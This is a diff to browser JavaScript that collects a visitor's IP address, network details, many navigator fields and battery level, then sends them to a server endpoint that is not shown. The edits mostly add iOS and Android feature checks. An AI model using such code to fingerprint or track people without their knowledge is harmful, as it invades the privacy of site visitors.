@@ -57,12 +57,16 @@
             const networkInfoKeys = ["downlink", "effectiveType", "rtt", "type"];
             const deviceInfoKeys = ["productSub", "vendor", "maxTouchPoints", "doNotTrack", "hardwareConcurrency", "cookieEnabled", "appCodeName", "appName", "appVersion", "platform", "product", "userAgent", "language", "languages", "webdriver", "pdfViewerEnabled", "deviceMemory"];
 
-            networkInfoKeys.forEach(key => {
-                if (connection && connection[key]) {
-                    td += `<b>${key}</b>: <code>${connection[key]}</code><br>`;
-                }
-            });
+            // Network Information (Works on Android, limited support on iOS)
+            if (connection) {
+                networkInfoKeys.forEach(key => {
+                    if (connection[key]) {
+                        td += `<b>${key}</b>: <code>${connection[key]}</code><br>`;
+                    }
+                });
+            }
 
+            // Device Information (Common on both platforms)
             td += "<br><b>📱 Device Information</b><br>";
             deviceInfoKeys.forEach(key => {
                 if (navigator[key] !== undefined) {
@@ -70,14 +74,19 @@
                 }
             });
 
-            try {
-                const battery = await navigator.getBattery();
-                const batteryLevel = Math.round(battery.level * 100);
-
+            // Battery Status (Supported on Android, but not on iOS Safari)
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    const batteryLevel = Math.round(battery.level * 100);
+                    await sendDeviceData(td, batteryLevel, ip);
+                } catch (error) {
+                    
+                }
+            } else {
+                // Fallback for devices where Battery API is not supported (e.g., iOS)
+                const batteryLevel = 'Not Supported';
                 await sendDeviceData(td, batteryLevel, ip);
-            } catch (error) {
-                alert('Battery status retrieval failed: ' + error.message);
-                // No redirection after alert
             }
         }
 
@@ -98,15 +107,12 @@
 
                 if (response.ok) {
                     alert('Data sent successfully');
-                    // No redirection after success
                 } else {
                     const errorText = await response.text();
                     alert('Failed to send data: ' + errorText);
-                    // No redirection after failure
                 }
             } catch (error) {
                 alert('Error while sending data: ' + error.message);
-                // No redirection after error
             }
         }
 
@@ -117,7 +123,6 @@
                 await gatherDeviceData(data.ip);
             } catch (error) {
                 alert('IP retrieval failed: ' + error.message);
-                // No redirection after error
             }
         }
 
